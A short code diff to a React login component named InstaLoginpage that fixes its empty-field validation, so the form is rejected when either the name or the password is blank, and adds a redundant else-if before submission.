@@ -28,10 +28,10 @@ const InstaLoginpage = () => {
             .catch(err => console.error(err));
     })
     const handleLogin =  async () => {
-        if (name === "" && password === "") {
+        if (name === "" || password === "") {
             setErr("Input's cannot be empty")
         }
-        else {
+        else if (name != '' && password != '') {
             setLoading(true)
             const allinputTitle = {
                 Name: name,
